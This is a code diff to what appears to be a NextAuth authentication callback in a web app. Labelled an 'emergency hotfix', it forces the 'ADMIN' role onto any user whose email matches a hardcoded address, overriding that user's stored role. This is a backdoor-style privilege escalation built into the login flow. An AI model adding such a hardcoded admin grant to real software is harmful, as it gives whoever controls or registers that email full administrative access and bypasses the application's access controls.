@@ -85,7 +85,14 @@ export const authOptions: AuthOptions = {
             try {
                 if (user) {
                     token.id = user.id;
-                    token.role = user.role;
+                    // EMERGENCY HOTFIX: Force Admin Role for specific email
+                    const adminEmails = ["aurora@admin.com"];
+                    if (user.email && adminEmails.includes(user.email)) {
+                        token.role = "ADMIN";
+                    } else {
+                        token.role = user.role;
+                    }
+
                     token.companyId = user.companyId;
                     token.isCompanyAdmin = user.isCompanyAdmin;
                     token.telegram = (user as any).telegram;
